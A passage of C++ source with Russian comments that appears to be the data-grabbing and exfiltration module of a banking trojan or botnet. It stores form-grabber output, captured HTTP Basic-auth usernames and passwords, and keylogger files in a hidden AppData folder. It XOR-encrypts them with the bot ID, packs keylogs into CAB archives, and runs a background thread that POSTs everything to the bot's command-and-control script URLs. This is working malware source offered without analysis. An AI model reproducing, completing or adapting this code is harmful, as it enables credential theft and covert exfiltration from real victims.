		if (Strings::IndexOf(Files, FileName) >= 0)
			return;
		LDBG("Loader", "Обрабатываем файл данных %s", FileName);

		if (DataGrabber::SendDataFile(FileName))
            Strings::Add(Files, FileName);
	}
	//------------------------------------------------------------------------

	#ifdef UniversalKeyLoggerH

		void ProcessKeyLogFile(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
		{

			const static char TempCabName[] = {'k', 't', 'c', '0', '0', '1', '.', 'c', 'a', 'b', 0};

			// Обрабатываем файлы кейлогера
			PStrings Files = (PStrings)Data;
			if (Strings::IndexOf(Files, FileName) >= 0)
				return;

			// Отправляем файл
			bool Invalid = false;
			if (!KeyLogger::CanSendLoggerFile(FileName, &Invalid))
			{
				if (Invalid)
					Strings::Add(Files, FileName);
				return;
            }


			LDBG("Loader", "Отправляем файл кейлогера %s", FileName);

			PCHAR Path = DataGrabber::GetRepositoryPath();
			PCHAR CabName = STR::New(2, Path, TempCabName);
            PCHAR AppName = NULL;

			// создаём каб архив
			if (KeyLogger::PackLoggerFileToCAB(FileName, CabName, &AppName))
			{
				// В случае успешной отправки файла добавляем его в список
				// удаления
				if (DataGrabber::SendCab(CabName, AppName))
					Strings::Add(Files, FileName);
				STR::Free(AppName);
			}
			else
                Strings::Add(Files, FileName);

			// Удаляем временный каб архив
			pDeleteFileA(CabName);

			STR::Free(Path);
			STR::Free(CabName);
		}
	#endif

	//------------------------------------------------------------------------

	void DeleteFiles(PStrings Files)
	{
		// Удалить файлы из списка
		DWORD i = Strings::Count(Files);
		if (i == 0) return;

		while (i > 0)
		{
			PCHAR File = Strings::GetItem(Files, i - 1, false);
			if ((BOOL)pDeleteFileA(File))
				Strings::Delete(Files, i - 1);
			i--;
		}

    }

    //------------------------------------------------------------------------
	HANDLE CreateMonitorHandle(PCHAR Path)
	{
		// инициализируем слежение за изменениями в директории
		PCHAR Tmp = STR::New(Path);
		PCHAR EL = STR::End(Tmp);
		// Отсекаем конечный слеш
		EL--;
		while (EL > Tmp && *EL == '\\')
		{
		 *EL = 0;
		 EL--;
        }
			
		HANDLE H = pFindFirstChangeNotificationA(Tmp, 0, FILE_NOTIFY_CHANGE_FILE_NAME);
		STR::Free(Tmp);
		return H;
	}


    //------------------------------------------------------------------------
	DWORD WINAPI DataSenderThreadProc(LPVOID Data)
	{
		// процедура мониторинга за хранилишем отправляемых данных
		#ifdef BV_APP
			// зАДЕРЖКА ДЛЯ ОТЛАДОЧНОГО ПРИЛОЖЕНИЯ
			pSleep(1000);
		#endif

        LDBG("Loader", "Поток отправки данных запущен");

		PCHAR Path = DataGrabber::GetRepositoryPath();

		if (Path == NULL)
			pExitThread(0);

		// Ставим задержку перед запуском
		PStrings Files = Strings::Create();

		// Запускаем бесконечный цикл мониторинга за хранилищем
		const static DWORD WaitInterval = 5*60*1000;

		while (1)
		{
			LDBG("Loader", "Обрабатываем хранилище отправляемых данных");
			// Отправляем файлы грабера
			SearchFiles(Path, (PCHAR)DataFileMask, false, FA_ANY_FILES, Files, ProcessDataFile);

			// Отправляем файлы кейлогера
			#ifdef UniversalKeyLoggerH
               	SearchFiles(Path, (PCHAR)KeyLogFileMask, false, FA_ANY_FILES, Files, ProcessKeyLogFile);
			#endif

            // Удаляем отправленные файлы
			DeleteFiles(Files);

			// Инициализируем события ожидания
			// Во время отправки данных некоторые функции создают промежуточные
			// что приводит к возникновению событий файловой системы.
			// По этому инициализацию объекта уведомление об изменениях
			// файловой системы будем проводить в каждой иттерации цикла
			HANDLE Handle = CreateMonitorHandle(Path);

		   //	pFindNextChangeNotification(Handle);

			pWaitForSingleObject(Handle, WaitInterval);

			pFindCloseChangeNotification(Handle);


        }
		Strings::Free(Files);
	}
}

// Функция возвращает путь к папке хранилища данных
PCHAR DataGrabber::GetRepositoryPath()
{
	 // Функция возвращает путь к директории хранения данных приложений
	const static char StoragePath[] = {'\\', 'M', 'i', 'c', 'r', 'o', 'S', 'T', '\\',  0};

	PCHAR Path = STR::Alloc(MAX_PATH);

	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, true))
	{
		STR::Free(Path);
		return NULL;
	}
	StrConcat(Path, (PCHAR)StoragePath);
	// Проверяем существование директории
	// В случае отсутствия создаём
	if (!DirExists(Path))
		pCreateDirectoryA(Path, NULL);

	return Path;
}


PCHAR DataGrabber::GetDataFileName(PCHAR FileName)
{
	// Функция возвращает уникальное имя файла для хранения данных
	PCHAR Path = GetRepositoryPath();
	if (Path == NULL)
		return NULL;
	PCHAR FName = NULL;
	if (STR::IsEmpty(FileName))
	{
		FName = STR::Alloc(StrCalcLength(Path) + 100);
		pGetTempFileNameA(Path, "Data", 0, FName);
	}
	else
    	FName = STR::New(2, Path, FileName);

	STR::Free(Path);

	return FName;
}


PCHAR DataGrabber::GetKeyLoggerFileName()
{
	// Функция возвращает имя файла для хранения данных кейлогера
	// Функция возвращает уникальное имя файла для хранения данных
	PCHAR Path = GetRepositoryPath();
	if (Path == NULL)
		return NULL;
	DWORD ExtLen  = StrCalcLength((PCHAR)KeyLogFileExt);

	PCHAR FileName = STR::Alloc(STR::Length(Path) + 100);

	STR::Copy(Path, FileName, 0, STR::Length(Path));
	do
	{
		PCHAR Tmp = FileName + STR::Length(Path);
		for (int i = 0; i < 5; i++)
        {
			*Tmp = (char)Random::Generate('a', 'z');
            Tmp++;
		}

		STR::Copy((PCHAR)KeyLogFileExt, Tmp, 0, ExtLen);
		Tmp += ExtLen;
        *Tmp = 0;
	}
	while (FileExistsA(FileName));



	STR::Free(Path);
	return FileName;
}


PCHAR DataGrabber::GetRepositoryPassword()
{
	// Функция возвращает пароль, которым будут шифроваться файлы
	return GenerateBotID();
}


PDataFile DataGrabber::CreateDataFile(DWORD DataType)
{
	// Создать файл данных
	PCHAR FileName = GetDataFileName();
	if (FileName == NULL)
		return false;

	PDataFile File = DataFile::CreateFile(FileName, GrabberFileSignature);

	if (File != NULL)
	{
        File->Head.Flags   = DataType;

		File->CryptMode   = fcBlock;
		File->CryptKey    = GetRepositoryPassword();
		File->CryptMethod = XORCrypt::Crypt;

	}

    STR::Free(FileName);

	return File;
}


void DataGrabber::CloseDataFile(PDataFile File)
{
	// Создать файл данных
	// Записываем данные и закрываем файл
	DataFile::WriteFile(File);

	STR::Free((PCHAR)File->CryptKey);

	PCHAR FileName = File->FileName;
	File->FileName = NULL;

	DataFile::CloseFile(File);

    // Меняем расширение файлаЮ для последующей отправки

    PCHAR NewFileName = STR::New(2, FileName, DataFileExt);

	pMoveFileA(FileName, NewFileName);

	STR::Free(FileName);
	STR::Free(NewFileName);
}


bool DataGrabber::AddData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType)
{
	// Функция складывает данные в хранилище для последующей отправки

	PDataFile File = CreateDataFile(DataType);

	if (File == NULL) return false;


	// Заполняем файл данными
	File->Head.FlagsEx = Browser;

	DataFile::AddDataBlock(File, DATA_BLOCK_URL, URL);
	DataFile::AddDataBlock(File, DATA_BLOCK_USERAGENT, UserAgent);
	DataFile::AddDataBlock(File, DATA_BLOCK_DATA, Data);


    CloseDataFile(File);

	return true;
}


bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType)
{
	// Добавить данные HTML формы
	LDBG("Loader", "Добавляем в хранилище HTML данные");

	PCHAR SendData = STR::New(3, URL, "?|POST:", Data);

	bool Res = AddData(URL, SendData, UserAgent, Browser, DataType);

	STR::Free(SendData);
	return Res;
}



bool DataGrabber::SendDataFile(PCHAR FileName)
{
	// Отправить файл данных на сервер
	// Функция должна вернуть истину в случае если
	// данные успешно отправлены либо после работы функции необходимо
	// удалить файл
	if (STR::IsEmpty(FileName))
		return false;

	LDBG("Loader", "-----------------------------------------------------------");
    LDBG("Loader", "Отправляем файл данных %s", FileName);

	PDataFile File = DataFile::OpenFile(FileName, GrabberFileSignature);
	if (File == NULL)
	{
		LDBG("Loader", "Ошибка открытия файла. Код ошибки %d", pGetLastError());
		return false;
    }

	// Проверяем версию файла
	if (File->Head.Version != DATA_FILE_VERSION)
	{
		LDBG("Loader", "Версия файла не поддерживается");
		DataFile::CloseFile(File);
        return true;
    }

	PCHAR Password = GetRepositoryPassword();
	File->CryptMode     = fcBlock;
	File->CryptKey      = Password;
	File->DecryptMethod = XORCrypt::Crypt;

	DataFile::ReadFile(File);

	bool Result = true; // Для удаления необработанного файла

	// Вызываем метод отправки файла
	LDBG("Loader", "Определяем обработчик файда");
	switch (File->Head.Flags)
	{
		case DATA_TYPE_FORM:   Result = SendFormGrabberData(File); break;
		case DATA_TYPE_INJECT: Result = SendFormGrabberData(File); break;
        case DATA_TYPE_CAB:    Result = SendСabFromDataFile(File); break;
	default: LDBG("Loader", "Неизвестный тип данных");;
	}

	//-------------------------------

	DataFile::CloseFile(File);
	STR::Free(Password);
	return Result;
}

void DataGrabber::StartDataSender()
{
	// Запустить поток отложенной отправки данных
   StartThread(DataSender::DataSenderThreadProc, NULL);
}


void DataGrabber::AddBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password)
{
	// Функция добавляет данные BASIC авторизации для отправки на сервер
	if (Session == NULL || STR::IsEmpty(Password))
		return;

	PCHAR SendBuf = STR::New(4, "username=", UserName, "&password=", Password);

	AddHTMLFormData(Session->URL, SendBuf, Session->UserAgent, Session->BrowserType, DATA_TYPE_FORM);

	STR::Free(SendBuf);
}
//----------------------------------------------------------------------------

bool DataGrabber::SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *HTML)
{
	pOutputDebugStringA("DataGrabber::SendHTMLDataToServer");
	// Функция отправки HTML данных на удалённый скрипт

    LDBG("Loader", "Отправляем HTML данные на сервер. \r\n URL: [%s]", URL);

	if (URL == NULL || Data == NULL)
		return false;


	PCHAR BT = StrLongToString(Data->BrowserType);
	PCHAR DT = StrLongToString(Data->DataType);

	// Создаём данные формы
	PStrings S = Strings::Create();
	AddURLParam(S, "id", Data->BotID);
	AddURLParam(S, "brw", BT);
	AddURLParam(S, "type", DT);
	AddURLParam(S, "data", Data->Data);
	STR::Free(BT);
	STR::Free(DT);
	// Отправляем форму
	THTTPResponse Response;
	ClearStruct(Response);
	#ifdef CryptHTTPH
        PCHAR Password = GetMainPassword();
		bool Res = CryptHTTP::Post(URL, Password, S, HTML, &Response);
        STR::Free(Password);
	#else
		bool Res = HTTP::Post(URL, S, HTML, &Response);
	#endif
	Strings::Free(S);

	PCHAR Document = NULL;
	if (HTML != NULL)
		Document = *HTML;
	Res = Res && CheckValidPostResult(&Response, Document);
    HTTPResponse::Clear(&Response);
	
	if (Res)
		LDBG("Loader", "HTML данные успещно отправлены");
	else
		LDBG("Loader", "Не удалось отправить HTML данные");

	return Res;
}


bool DataGrabber::SendFormGrabberData(PDataFile File)
{
	// Отправить данные HTML форм
	if (File == NULL)
		return false;

	LDBG("Loader", "Отправляем данные формграбера");

	// Отправляем данные HTML форм на сервер

	TSendHTMLData Data;
	ClearStruct(Data);

	// Заполняем структуру отправки данных
	Data.DataType = File->Head.Flags;
	Data.BrowserType = File->Head.FlagsEx;
	Data.BotID = GenerateBotID();
	Data.URL       = MEMBLOCK::GetBlockByAsStr(File->Blocks, DATA_BLOCK_URL);
	Data.UserAgent = MEMBLOCK::GetBlockByAsStr(File->Blocks, DATA_BLOCK_USERAGENT);
	Data.Data      = MEMBLOCK::GetBlockByAsStr(File->Blocks, DATA_BLOCK_DATA);


	// Вызываем обработчики отправки
	bool Cancel = false;
	CallSendDataHandlers(&Data, Cancel);

	bool R = false;
	if (!Cancel)
	{
		// Отправляем данные
		PCHAR Script = GetBotScriptURL(SCRIPT_FORM_GRABBER);
		R = SendHTMLDataToServer(Script, &Data, NULL);
		STR::Free(Script);
	}

	STR::Free(Data.URL);
	STR::Free(Data.UserAgent);
	STR::Free(Data.Data);
	STR::Free(Data.BotID);

	return R;
}

bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName)
{
	// Отправляем пост запрос на скрипт хранения данных кейлогера
	if (!FileExistsA(CabFileName))
		return false;

	bool FreeUrl = STR::IsEmpty(URL);
	if (FreeUrl)
		 URL = GetBotScriptURL(SCRIPT_CAB);

    LDBG("Loader", "Отправляем CAB архив с именем [%s]", AppName);

	// Формируем пост данные
	PMultiPartData Data = MultiPartData::Create();
	if (Data == NULL) return false;

	// Получаем идентификатор бота
	PCHAR BotID = GenerateBotID();

	// Добавляем поля
	MultiPartData::AddStringField(Data, "id", BotID);
	MultiPartData::AddStringField(Data, "type_name", AppName);
    MultiPartData::AddFileField(Data, "cab", CabFileName, NULL);


	STR::Free(BotID);

	// Отправляем запрос
	THTTPResponse Response;
	ClearStruct(Response);

    bool Result = HTTP::Post(URL, Data, NULL, &Response);
 
	if (Result)
        Result = CheckValidPostResult(&Response, NULL);

	HTTPResponse::Clear(&Response);
	MultiPartData::Free(Data);
	if (FreeUrl)
		STR::Free(URL);
	return Result;
}


bool DataGrabber::SendСabFromDataFile(PDataFile File)
{
	// Метод обработки отложенной отправки CAB архива
	const static char TempCabName[] = {'s', 'd', 'c', 'a', 'b', 'f', 'i', 'l', 'e', '.', 'c', 'a', 'b',  0};

	if (File == NULL) return false;

	// Получаем данные из файла
   	PMemBlock Cab = MEMBLOCK::GetBlockByID(File->Blocks, DATA_BLOCK_CAB);
    if (Cab == NULL) return true; // Возвращаем истину для удаления файла

	PCHAR URL     = MEMBLOCK::GetBlockByAsStr(File->Blocks, DATA_BLOCK_URL);
	PCHAR AppName = MEMBLOCK::GetBlockByAsStr(File->Blocks, DATA_BLOCK_APPNAME);


	// Записываем архив во временный файл
	PCHAR FileName = GetDataFileName((PCHAR)TempCabName);

	File::WriteBufferA(FileName, Cab->Data, Cab->Size);

	// Отправляем
	bool Result = SendCab(URL, FileName, AppName);

	// Удаляем временный файл
	pDeleteFileA(FileName);

	// Уничтожаем данные
	STR::Free(URL);
	STR::Free(AppName);
	STR::Free(FileName);

	return Result;
}

bool DataGrabber::SendCab(PCHAR CabFileName, PCHAR AppName)
{
	return SendCab(NULL, CabFileName, AppName);
}

bool DataGrabber::SendCabDelayed(PCHAR URL, PCHAR CabFileName, PCHAR AppName)
{
	// Отложенная отправка архива
	// функция добавляет файл в очередь отправки и возвращает управление
	// Файл архива дублируется. По этому его можно удалить сразу после
	// вызова функции

	DWORD CabSize = 0;
	LPBYTE Data = File::ReadToBufferA(CabFileName, CabSize);
    if (Data == NULL) return false;

	LDBG("Loader", "Отложенная отправка cab архива. Система [%s]", AppName);

	PDataFile File = CreateDataFile(DATA_TYPE_CAB);

	if (File != NULL)
	{
		DataFile::AddDataBlock(File, DATA_BLOCK_URL, URL);
		DataFile::AddDataBlock(File, DATA_BLOCK_APPNAME, AppName);
		DataFile::AddDataBlock(File, DATA_BLOCK_CAB, Data, CabSize);

		CloseDataFile(File);
	}

    MemFree(Data);
	return true;
}
